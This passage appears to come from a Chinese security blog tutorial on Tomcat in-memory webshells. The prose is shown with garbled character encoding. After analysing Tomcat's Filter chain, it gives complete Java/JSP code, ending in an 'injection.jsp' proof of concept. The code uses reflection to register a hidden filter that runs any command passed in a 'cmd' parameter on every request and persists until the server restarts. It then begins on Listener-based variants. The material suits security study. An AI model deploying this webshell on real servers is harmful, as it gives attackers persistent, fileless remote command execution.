æ–¹æ³•ï¼Œæœ‰ä¸¤ä¸ªï¼Œè°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç°ç¡®å®ä¼šè°ƒç”¨å…¶ä¸­ä¸€ä¸ªdoFIlter()æ–¹æ³•ï¼š\nç„¶åè‡ªç„¶å°±ä¼šè°ƒç”¨ApplicationFilterChainç±»çš„doFIlter()æ–¹æ³•ï¼Œç„¶åè°ƒç”¨internalDoFilter()æ–¹æ³•ï¼Œè¿‡ç¨‹åœ¨å‰é¢çš„Filteré“¾çš„ä¹Ÿæœ‰è¯´ã€‚\nåªä¸è¿‡è¿™é‡Œè¿˜æ˜¯æœ‰ä¸åŒçš„ï¼š è¿™é‡Œçš„nå°±åªä¸º1ï¼Œæ‰€ä»¥è¿™é‡Œè·å–åˆ°çš„filterç›´æ¥å°±æ˜¯æˆ‘ä»¬å‰é¢è°ƒç”¨åˆ†ææ—¶æœ€åçš„tomcatè‡ªå¸¦çš„WsFilterã€‚\nåé¢ä¹Ÿå°±æ˜¯å‰é¢åˆ†æè¿‡äº†çš„ï¼Œç®€å•ç»™ç»™æµç¨‹ï¼š WsFilter#doFilter == \u0026gt; ApplicationFilterChain#doFilter ==\u0026gt; ApplicationFilterChain#internalDoFilter\nç„¶ååŒæ ·è°ƒç”¨äº†service()æ–¹æ³•ï¼š è¿™é‡Œæ˜¯å› ä¸ºæˆ‘ä»¬è®¿é—®çš„æ˜¯/ï¼Œåœ¨/è·¯ç”±æˆ‘ä»¬æ²¡æœ‰è‡ªå®šä¹‰filterï¼Œæ‰€ä»¥è¿™é‡Œå°±åªä¼šè°ƒç”¨ä¸€æ¬¡doFilterã€‚\næ‰€ä»¥å¦‚æœæˆ‘ä»¬è®¿é—®/filterè·¯ç”±ï¼Œå°±è¿˜ä¼šè¿›è¡Œä¸€æ¬¡ä¸Šé¢çš„è¿‡ç¨‹ï¼Œåªä¸è¿‡å°±æ˜¯æˆ‘ä»¬å‰é¢çš„åˆ†æFilter é“¾çš„æµç¨‹ã€‚\nè¡¥å…… è¡¥å……ä¸€ä¸‹å‰é¢çš„createFilterChain()æ–¹æ³•ä¸­è·å–contextéƒ¨åˆ†çš„åœ°æ–¹ï¼Œæˆ‘è¿™é‡Œæ˜¯ç”¨ä¸Šäº†è‡ªå®šä¹‰çš„ä¸¤ä¸ªfilterï¼Œå¦‚ä¸‹ä»£ç ï¼š\næˆ‘ä»¬ç°åœ¨æ¥çœ‹ä¸€ä¸‹è·å–åˆ°çš„contextçš„é‡ç‚¹å†…å®¹ï¼ŒåŠ ä¸€ä¸ªæ–­ç‚¹çœ‹ä¸€ä¸‹ï¼ˆè¿™é‡Œä»¥æˆ‘çš„è‡ªå®šä¹‰äº†ä¸¤ä¸ªfilterä¸ºä¾‹ï¼‰ï¼š\nåœ¨è¿™ä¸ªStandardContextå¯¹è±¡ä¸­åŒ…å«äº†filterConfigsã€filterDefsã€filterMapsï¼Œç°åœ¨æ¥åˆ†åˆ«è¯´æ˜ä¸€ä¸‹ã€‚\nfilterConfigs åœ¨StandardContextä¸­çš„å®šä¹‰ä¸ºï¼š\nç‚¹å¼€å‰é¢æ–­ç‚¹æƒ…å†µå¦‚ä¸‹ï¼š\næ˜¯ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨çš„ï¼Œæœ‰ä¸‰ä¸ªï¼Œä»¥ä¸€ä¸ªä¸ºä¾‹ï¼š\nå¯ä»¥çœ‹å‡ºfilterConfigsåŒ…å«äº†å½“å‰ä¸Šä¸‹æ–‡çš„ä¿¡æ¯ StandardContextã€filterDefç­‰ä¿¡æ¯\nè¿™é‡Œçš„ filterDef å­˜æ”¾äº†filter çš„å®šä¹‰ï¼ŒåŒ…æ‹¬filterClassã€filterNameç­‰ä¿¡æ¯ã€‚å…¶å®å°±æ˜¯web.xmlä¸­çš„ \u0026lt;filter\u0026gt;æ ‡ç­¾ã€‚\nfilterDefs å®ƒåœ¨StandardContextä¸­çš„å®šä¹‰ä¸ºï¼š ç‚¹å¼€å¦‚ä¸‹ï¼š\nfilterDefsæ˜¯ä¸€ä¸ªHashMapï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨ filterDefï¼Œç‚¹å¼€å…¶ä¸­ä¸€ä¸ªçœ‹çœ‹ï¼š\nfilterMaps filterMaps ä¸­å°±å‚¨å­˜åˆ°äº†å¾ˆå¤šæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä»¥arrayçš„å½¢å¼å­˜æ”¾äº†å„filterçš„è·¯å¾„æ˜ å°„ä¿¡æ¯ï¼Œå…¶å¯¹åº”çš„æ˜¯web.xmlä¸­çš„\u0026lt;filter-mapping\u0026gt;æ ‡ç­¾ï¼š\nè¿™é‡Œæˆ‘å°†è‡ªå®šä¹‰çš„ä¸¤ä¸ªfilteræ ‡å‡ºæ¥äº†ã€‚ä»ä¸­å¯ä»¥çœ‹å‡ºfilteré¡ºåºæ˜¯å¯¹çš„ï¼Œä¹Ÿæœ‰ä¸€äº›å¿…è¦çš„ä¿¡æ¯ã€‚\nâ€”â€”â€”â€”\næ‰€ä»¥åé¢çš„è·å–filterMapsçš„ä»£ç :\nåº”è¯¥å°±æ˜¯è·å–åˆ°å°±æ˜¯filterMapsã€‚\nâ€”â€”â€”â€”â€”â€”\nä»ä¸Šé¢å°±å¯ä»¥çœ‹å‡ºæ¥Contextå«æœ‰filterçš„å¿…è¦ä¿¡æ¯ã€‚\nå¦‚ä½•æ”»å‡» åŠ¨æ€æ³¨å†ŒFilter ä»å‰é¢çš„åˆ†æå¯ä»¥çŸ¥é“ï¼Œåªè¦æˆ‘ä»¬å‘web.xmlä¸­æ³¨å†Œä¸€ä¸ªfilterï¼Œç„¶åæˆ‘ä»¬å°†è¿™ä¸ªfilterå¯¹åº”ä»£ç è®¾ç½®æˆæ¶æ„ä»£ç ï¼Œå°±èƒ½å®ç°å‘½ä»¤æ³¨å…¥ã€‚\nä½†æ˜¯åœ¨å®é™…ç¯å¢ƒä¸­æ˜¯ä¸å¯èƒ½æœ‰è¿™ç§æƒ…å†µçš„ã€‚é‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³å‘¢ã€‚\nåœ¨å‰é¢çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬åˆ†æäº†ApplicationFilterChainçš„filtersçš„èµ‹å€¼è¿‡ç¨‹ï¼Œè°ƒç”¨äº†ApplicationFilterFactoryç±»çš„createFilterChain()æ–¹æ³•ï¼Œå…¶ä¸­çš„filterMapså³ä¸ºå…¶ä¸­é‡è¦çš„ä¸€ç¯ã€‚\næ—¢ç„¶å…³é”®éƒ½æ˜¯filterMapsäº†ï¼Œé‚£ä¹ˆè¿™é‡ŒåŒæ ·çš„å¾ˆå…³é”®çš„å˜é‡å°±æ˜¯contextï¼š è¿™é‡Œå°±ä¼šè·å–åˆ°StandardContextå®ä¾‹ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€Ÿç”¨Javaåå°„æ¥ä¿®æ”¹filterConfigsï¼ŒfilterDefsï¼ŒfilterMapsè¿™ä¸‰ä¸ªå˜é‡ï¼Œå°†æˆ‘ä»¬æ¶æ„æ„é€ çš„FIlternameä»¥åŠå¯¹åº”çš„urlpatternå­˜æ”¾åˆ°FilterMapsï¼Œä»è€Œè¾¾åˆ°å†…å­˜æ³¨å…¥çš„æ“ä½œ\nè¯´æ˜ä¸€ä¸‹åŠ¨æ€æ·»åŠ æ¶æ„Filterçš„æ€è·¯ï¼š\nè·å–å½“å‰webåº”ç”¨çš„StandardContextå¯¹è±¡ åˆ›å»ºæ¶æ„Filter ä½¿ç”¨FilterDefå¯¹Filterè¿›è¡Œå°è£…ï¼Œå¹¶æ·»åŠ å¿…è¦çš„å±æ€§ åˆ›å»ºfilterMapç±»ï¼Œå¹¶å°†è·¯å¾„å’ŒFilternameç»‘å®šï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterMapsä¸­ ä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­ã€‚ è·å–StandardContextå¯¹è±¡ StandardContextå¯¹è±¡ä¸»è¦ç”¨æ¥ç®¡ç†Webåº”ç”¨çš„ä¸€äº›å…¨å±€èµ„æºï¼Œå¦‚Sessionã€Cookieã€Servletç­‰ã€‚å› æ­¤æœ‰å¾ˆå¤šæ–¹æ³•æ¥è·å–StandardContextå¯¹è±¡ã€‚\nè¿™é‡Œè¦ç”¨åˆ°ServletContextï¼Œç®€å•è¯´æ˜ä¸€ä¸‹ServletContextè·ŸStandardContextçš„å…³ç³»ï¼š\nTomcatä¸­å®ç°ServletContextæ¥å£çš„æœ‰å¦‚ä¸‹ä¸‰ä¸ªï¼š\nï¼ˆå†…è¡¨ç¤ºç»§æ‰¿çš„çˆ¶ç±»å®ç°äº†æ¥å£ä½†æœ¬ç±»æ²¡æœ‰ç›´æ¥å¼•å…¥æ¥å£ï¼‰\nè¿™é‡Œé‡ç‚¹å…³æ³¨ApplicationContextç±»å’ŒApplicationContextyFacadeç±»ã€‚\nåœ¨webåº”ç”¨ä¸­è·å–çš„ServletContextå®é™…ä¸Šæ˜¯ApplicationContextFacadeå¯¹è±¡ï¼Œå¯¹ApplicationContextè¿›è¡Œäº†å°è£…ï¼š è€ŒApplicationContextå®ä¾‹ä¸­åˆåŒ…å«äº†StandardContextå®ä¾‹ï¼š\nå½“æˆ‘ä»¬èƒ½ç›´æ¥è·å– request çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥å°†Servlet è½¬ä¸º StandardContextï¼Œä»è€Œè·å–contextã€‚\nè·å–contextæµç¨‹å¦‚ä¸‹ï¼š\nServletContext -\u0026gt; ApplicationContextï¼š\n1 2 3 4 ServletContext servletContext = rerquest.getSession().getServletContext(); Field context0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); context0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)context0.get(servletContext); è¿™é‡Œæ˜¯ä¸ºäº†è·å–åˆ°(ApplicationContext)contextï¼Œå³contextå˜é‡å¯¹åº”çš„ApplicationContextç±»å®ä¾‹ã€‚\nApplicationContext -\u0026gt; StandardContextï¼š\n1 2 3 Field context1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); context1.setAccessible(true); StandardContext standardContext = (StandardContext)context1.get(applicationContext) è¿™é‡Œæ˜¯ä¸ºäº†è·å–åˆ°(StandardContext)contextï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬å°±è·å–åˆ°äº†StandardContextç±»å‹çš„contextï¼Œå’Œå‰é¢createFilterChain()æ–¹æ³•ä¸­è·å–åˆ°çš„contextå˜é‡å¯¹åº”ã€‚\nåˆ›å»ºæ¶æ„filter 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Filter evilFilter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String cmd; if ((cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;)) != null) { Runtime runtime = Runtime.getRuntime(); runtime.exec(cmd); return; } filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } }; å¦‚ä½•å°è£… æ—¢ç„¶å‰é¢æˆ‘ä»¬è·å–åˆ°äº†StandardContextå‹çš„contextï¼Œåœ¨å‰é¢çš„è¡¥å……ä¸­ï¼Œä¹Ÿè¯´æ˜è¿™ä¸ªcontextå˜é‡ä¸­å¾ˆé‡è¦çš„ä¸‰ç‚¹ï¼šfilterConfigsã€filterDefsã€filterMapsã€‚\næ‰€ä»¥å…¶å®è¿™é‡Œçš„é‡ç‚¹å°±æ˜¯å¦‚ä½•æ›´æ”¹è¿™ä¸‰ä¸ªå˜é‡ä»è€Œåœ¨createFilterChain()æ–¹æ³•ä¸­è·å–filterMapsæ—¶å¯ä»¥åŠ å…¥æ¶æ„çš„filterã€‚\nçœ‹StandardContextæºç ï¼Œå…ˆè¯´æ˜å…¶ä¸­å‡ ä¸ªæ–¹æ³•ï¼š\naddFilterDef()\næ·»åŠ ä¸€ä¸ªfilterDefåˆ°Contextï¼š\nè¿™é‡Œçš„filterDefså˜é‡å®šä¹‰ï¼š æ‰€ä»¥å°±æ˜¯æ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹è¿›å»ã€‚\naddFilterMapBefore\næ·»åŠ filterMapåˆ°æ‰€æœ‰filteræœ€å‰é¢ï¼š ApplicationFilterConfig\nè¿˜æœ‰ä¸ªå°±æ˜¯filterConfigsï¼Œä½†æ˜¯è¿™ä¸ªä¸æ˜¯å•çº¯çš„ä¸€ä¸ªadd\u0026hellip;å°±å¯ä»¥åŠ å…¥ï¼Œä»£ç å¦‚ä¸‹ï¼š\nå†çœ‹ä¸€ä¸‹filterConfigså˜é‡çš„å®šä¹‰ï¼š æ‰€ä»¥åŒæ ·æ˜¯æ”¾å…¥é”®å€¼å¯¹ã€‚\nä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºåœ¨è¿™é‡Œä¼šè°ƒç”¨ApplicationFilterrConfigçš„æ„é€ æ–¹æ³•ï¼š â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nç°åœ¨å°±å¯ä»¥å¼€å§‹å°è¯•æ„é€ äº†ï¼š\nFilterDef\nè¿™ä¸ªç±»ä½äºorg.apache.tomcat.util.descriptor.web.FilterDef;ï¼Œæˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªFilterDefå¯¹è±¡ï¼Œå¹¶å°†æ¶æ„æ„é€ çš„æ¶æ„ç±»æ·»åŠ åˆ°filterDefä¸­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 //å‰é¢åˆ›å»ºæ¶æ„filteræ˜¯ç”¨çš„åŒ¿åå†…éƒ¨ç±»çš„æ–¹å¼åˆ›å»ºçš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥publicå£°æ˜ä¸€ä¸ªæ¶æ„çš„filterç±»ï¼Œåˆ©ç”¨æ–¹å¼ä¸åŒè€Œå·²ã€‚ String name = \u0026#34;badFilter\u0026#34;; FilterDef filterDef = new FilterDef(); //è®¾ç½®filteråç§° filterDef.setFilterName(name) //å£°æ˜filterç±»ä»£ç æº filterDef.setFilterClass(evilFilter.getClass().getName()); filterDef.setFilter(evilFilter); //æ·»åŠ filterDef standardContext.addFilterDef(filterDef); å¯ä»¥å’Œå‰é¢è¡¥å……é‡Œç»™å‡ºçš„ç›¸å¯¹åº”çš„filteDefsçš„å›¾ç‰‡å¯¹æ¯”ä¸€ä¸‹ï¼Œå¤§æ¦‚å°±èƒ½çŸ¥é“è¿™é‡Œä½¿ç”¨çš„æ–¹æ³•æ˜¯å¹²å˜›çš„ã€‚\nfilterMaps\nè¿™ä¸ªç±»ä½äºorg.apache.tomcat.util.descriptor.web.FilterMapï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªFilteMapå¯¹è±¡ï¼Œå¹¶å°†filteMapæ·»åŠ åˆ°æ‰€æœ‰filteæœ€å‰é¢ï¼š\n1 2 3 4 5 6 7 8 9 10 FilterMap filterMap = new FilterMap(); //è®¾ç½®æ‹¦æˆªè·¯ç”± filterMap.addURLPattern(\u0026#34;/*\u0026#34;); //name=badFilter filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); //æ·»åŠ æˆ‘ä»¬çš„filterMapåˆ°æ‰€æœ‰filterræœ€å‰é¢ standardContext.addFilterMapBefore(filterMap); è¿™é‡Œé‡ç‚¹è§£é‡Šä¸€ä¸‹filterMap.setDispatcher(DispatcherType.REQUEST.name());ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ç”¨æ¥è®¾ç½®FilterMapçš„å½“å‰çŠ¶æ€ï¼Œè¯¥çŠ¶æ€è¡¨ç¤ºä½•æ—¶åº”ç”¨è¿‡æ»¤å™¨ã€‚åœ¨è¿™é‡Œè¡¨ç¤ºä¸€ä¸ªç›´æ¥çš„å®¢æˆ·ç«¯è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯å½“ç”¨æˆ·ç›´æ¥è¯·æ±‚ä¸€ä¸ªèµ„æºæˆ–è€…é‡å®šå‘åˆ°è¾¾è¯¥èµ„æºæ—¶ï¼Œä¼šè§¦å‘è¿‡æ»¤å™¨ã€‚\nfilterConfig\nfilterConfigsä¸­å­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œå¹¶ä¸”ä»å‰é¢è¡¥å……æ¿å—çš„å›¾ä¸­ï¼Œå¯ä»¥çœ‹å‡ºfilterConfigä¸­å­˜æ”¾æœ‰filterDefå’Œfilteå¯¹è±¡ç­‰ä¿¡æ¯ã€‚\nå…ˆè·å–å½“å‰filterConfigsä¿¡æ¯ï¼š\n1 2 3 Field configs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); configs.setAccessible(true); Map filterConfigs = (Map)configs.get(standardContext); å†é€šè¿‡åå°„è·å–ApplicationFilterConfigçš„æ„é€ å™¨å¹¶åˆå§‹åŒ–ï¼š\n1 2 3 Constructor constructor1 = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(standardContext,filterDef); ç„¶åå°±æ˜¯å°†è¿™ä¸ªå®ä¾‹åŒ–çš„ApplicationFilterConfigæ”¾è¿›filterConfigsä¸­ï¼Œå¦‚ä¸‹ï¼š\n1 2 //name=badFilter filterConfigs.put(name,o); è‡³æ­¤å°±å·²ç»å…¨éƒ¨åˆ†æå®Œäº†ã€‚\nåŠ¨æ€æ³¨å…¥ ç»“åˆå‰é¢çš„åˆ†æï¼Œå…¶å®å·²ç»æ¯”è¾ƒæ¸…æ¥šäº†ã€‚æ€»ç»“çš„æµç¨‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 //è·å–ApplicationContextç±»å‹çš„context ServletContext facade = request.getSession().getServletContext(); Field field0 = facade.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(facade); //è·å–StandardContextç±»å‹çš„context Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //åˆ›å»ºæ¶æ„filter Filter evilFilter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String cmd; if ((cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;)) != null) { Runtime runtime = Runtime.getRuntime(); runtime.exec(cmd); return; } filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } }; //è®¾ç½®åŸºæœ¬çš„é¢„å®šä¹‰çš„filtername String name = \u0026#34;badFilter\u0026#34;; //åˆ›å»ºfilterDef FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(evilFilter.getClass().getName()); filterDef.setFilter(evilFilter); standardContext.addFilterDef(filterDef); //åˆ›å»ºfilterMap FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\u0026#34;/*\u0026#34;); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); //åˆ›å»ºfilterConfigæ‰€éœ€çš„ApplicationFilterConfig Constructor constructor1 = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(standardContext,filterDef); //æ”¾å…¥filterConfigs Field configs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); configs.setAccessible(true); Map filterMaps = (Map)configs.get(standardContext); filterMaps.put(name,o); æœ€ç»ˆPOC injection.jsp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 \u0026lt;%-- Created by IntelliJ IDEA. User: ASUS Date: 2024/9/1 Time: 13:34 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Map\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Constructor\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationFilterConfig\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Context\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.String\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% //è·å–ApplicationContextç±»å‹çš„context ServletContext facade = request.getSession().getServletContext(); Field field0 = facade.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(facade); //è·å–StandardContextç±»å‹çš„context Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //åˆ›å»ºæ¶æ„filter Filter evilFilter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String cmd; if ((cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;)) != null) { Runtime runtime = Runtime.getRuntime(); runtime.exec(cmd); return; } filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } }; //è®¾ç½®åŸºæœ¬çš„é¢„å®šä¹‰çš„filtername String name = \u0026#34;badFilter\u0026#34;; //åˆ›å»ºfilterDef FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(evilFilter.getClass().getName()); filterDef.setFilter(evilFilter); standardContext.addFilterDef(filterDef); //åˆ›å»ºfilterMap FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\u0026#34;/*\u0026#34;); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); //åˆ›å»ºfilterConfigæ‰€éœ€çš„ApplicationFilterConfig Constructor constructor1 = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(standardContext,filterDef); //æ”¾å…¥filterConfigs Field configs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); configs.setAccessible(true); Map filterMaps = (Map)configs.get(standardContext); filterMaps.put(name,o); //åŠ ä¸Šæç¤º out.println(\u0026#34;success inject\u0026#34;); %\u0026gt; ç„¶åå¼€å¯æœåŠ¡å™¨ï¼Œè®¿é—®ä¸€ä¸‹injection.jspï¼š\néšåå°±å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œäº†ï¼š\nå¹¶ä¸”è¿™ä¸ªå†…å­˜é©¬æ˜¯ä¸€ç›´å­˜åœ¨çš„ï¼Œç›´åˆ°è¿™ä¸ªtomcatæœåŠ¡å™¨å…³é—­ã€‚\nè¿˜æœ‰éœ€è¦æ³¨æ„çš„å°±æ˜¯tomcat7 ä¸ tomcat8 åœ¨FilterDefå’ŒFilterMapè¿™ä¸¤ä¸ªç±»æ‰€å±çš„åŒ…åä¸ä¸€æ ·ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;!-- tomcat 8/9 --\u0026gt; \u0026lt;% page import = \u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34; %\u0026gt; \u0026lt;% page import = \u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34; %\u0026gt; \u0026lt;!-- tomcat 7 --\u0026gt; \u0026lt;%@ page import = \u0026#34;org.apache.catalina.deploy.FilterMap\u0026#34; %\u0026gt; \u0026lt;%@ page import = \u0026#34;org.apache.catalina.deploy.FilterDef\u0026#34; %\u0026gt; Listenerå‹å†…å­˜é©¬ listenerèƒ½å¤Ÿç›‘å¬äº‹ä»¶ä»è€Œè¾¾æˆä¸€äº›æ­¤ç†¬è¿‡ã€‚åœ¨è¯·æ±‚ç½‘ç«™çš„æ—¶å€™ï¼Œç¨‹åºå…ˆæ‰§è¡Œlistenerç›‘å¬å™¨çš„å†…å®¹ï¼š Listener -\u0026gt; Filter -\u0026gt; Servlet\nLIstenerr ä¸‰ä¸ªåŸŸå¯¹è±¡ï¼š\n1 2 3 ServletContextListener //æœåŠ¡å™¨å¯åŠ¨å’Œç»ˆæ­¢æ—¶è§¦å‘ HttpSessionListener //æœ‰å…³sessionæ“ä½œæ—¶è§¦å‘ ServletRequestListener //è®¿é—®æœåŠ¡æ—¶è§¦å‘ æ¯«æ— ç–‘é—®ï¼Œè¿™é‡Œæœ€å¥½ç”¨çš„å°±æ˜¯SerrvletRequestListenerï¼Œå½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºæ—¶ï¼Œéƒ½ä¼šè§¦å‘ServletRequestListener#requestInitialized()æ–¹æ³•ã€‚\nåŸºæœ¬Listeneræ„é€  è¦æ„é€ listenerå¿…é¡»å®ç°EventListeneræ¥å£ã€‚è¿™ä¸ªæ¥å£çš„å®šä¹‰å¦‚ä¸‹ï¼š\nå¾ˆå¤šç±»éƒ½ç»§æ‰¿äº†è¿™ä¸ªæ¥å£ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦å®ç°å†…å­˜é©¬å°±éœ€è¦æ‰¾ä¸€ä¸ªæ¯ä¸ªè¯·æ±‚éƒ½ä¼šè¢«è§¦å‘çš„Listenerã€‚\nåœ¨è¿™é‡Œéœ€è¦ç”¨åˆ°çš„æ˜¯ServletRequestListeneræ¥å£ï¼Œå¦‚ä¸‹ï¼š è¿™ä¸ªæ¥å£ä¸­çš„æ–¹æ³•ç”¨äºç›‘å¬ServletRequestå¯¹è±¡çš„åˆ›å»ºçš„é”€æ¯ï¼Œä»å‰é¢çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“çŸ¥é“è¿™é‡Œçš„ServletRequestå°±æ˜¯è¯·æ±‚çš„â€œå¯¹è±¡â€ã€‚\nå½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºï¼Œæ— è®ºæ˜¯servletã€jspè¿˜æ˜¯é™æ€èµ„æºï¼Œéƒ½ä¼šè§¦å‘requestInitializedæ–¹æ³•ã€‚\nç®€å•æµ‹è¯•ä¸€ä¸‹ï¼š Listener.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package listener; import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; public class Listener implements ServletRequestListener{ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;æ‰§è¡Œäº†é”€æ¯\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { System.out.println(\u0026#34;æ‰§è¡Œäº†åˆ›å»º\u0026#34;); } } web.xml\n1 2 3 4 5 6 7 8 9 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;listener-class\u0026gt;listener.Listener\u0026lt;/listener-class\u0026gt; \u0026lt;/listener\u0026gt; \u0026lt;/web-app\u0026gt; å¯åŠ¨tomcatåï¼Œå°±ä¼šè§¦å‘Listenerçš„ç›‘å¬è¯·æ±‚ï¼Œè®¿é—®ä»»æ„çš„è·¯å¾„éƒ½ä¼šè§¦å‘ï¼š\nä¸Šé¢æ˜¯åœ¨å¼€å¯æ—¶è¿›è¡Œçš„ä¸¤æ¬¡åˆ›å»ºé”€æ¯ï¼Œä¸‹é¢å°±æ˜¯æˆ‘éšä¾¿è¾“çš„è®¿é—®è·¯å¾„æ‰§è¡Œçš„ä¸€æ¬¡åˆ›å»ºé”€æ¯ã€‚\nListeneræµç¨‹åˆ†æ åº”ç”¨è¿è¡Œå‰ 